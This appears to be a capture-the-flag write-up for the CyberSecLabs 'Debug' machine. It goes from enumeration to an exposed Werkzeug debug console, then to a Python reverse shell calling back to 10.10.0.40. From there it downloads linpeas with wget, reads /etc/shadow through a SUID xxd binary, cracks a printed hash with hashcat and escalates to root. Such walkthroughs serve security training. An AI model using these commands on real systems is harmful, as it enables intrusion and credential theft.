# CyberSecLabs : Debug

```Concept of WSGI```
Werkzeug is a comprehensive WSGI web application library.

WSGI means “Web Server Gateway Interface”. It is a specification that describes how a web server communicates with web applications, and how web applications can be chained together to process one request.

extra - reading : https://medium.com/swlh/hacking-flask-applications-939eae4bffed

Nmap

```zsh
nmap -sS -p- -r -Pn -T4 -v 172.31.1.5
```
You will see port ```80``` is open. Visit it is a simple website.

Dirsearch

This is not pre-installed in kali. Download it from github.

```zsh
python3 dirsearch.py -u http://172.31.1.5:80 -e r -R 3
```

https://palletsprojects.com/p/werkzeug/

```An interactive debugger that allows inspecting stack traces and source code in the browser with an interactive interpreter for any frame in the stack.```
This caught my eye. When I visited ```http://172.31.1.5/blog/2``` I could see some stack traces.

Dirsearch returned this interesting directory:
```[02:50:06] 200 -    2KB - /console```

On visting there was probably misconfigured console of werkzeug which uses python.

```import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.40",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);```

Start a listener before entering the above command with proper IP and you will have a shell. I have a edited python script (in the files part of github) which can achieve the same.

Note sometimes it might not work. It processes a request and then it takes time before it can try another.

You will have shell. Upload your linpeas

```sh
wget http://10.10.0.40:8000/linpeas.sh
```
Run it and you will see that it marks ```/usr/bin/xxd ```(the hex editor) has ```SUID``` bit set, use it to open the /root/system.txt . Will not work coz it is inside another directory.
I try to open the ```/etc/shadow```

```zsh
/usr/bin/xxd "/etc/shadow" | xxd -r
```
Copy the hash ```$6$YbP4.h/m$HTWC5ubw1dJK1Ed11RExV/55T0JlRnjtPcCyQEugG470lfZG2Eo8Id2ZeEb2vBnHRTVZls2kZNnaC7GZRCjwf``` but in a file ```hash.txt```. Now crack it.

```zsh 
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --force
```
-- force coz if you are using VM and do not have a GPU for cracking

Get the password. Spawn a tty shell using 

```sh
python -c 'import pty; pty.spawn("/bin/sh")'
```
Now just su root and enter the cracked pass.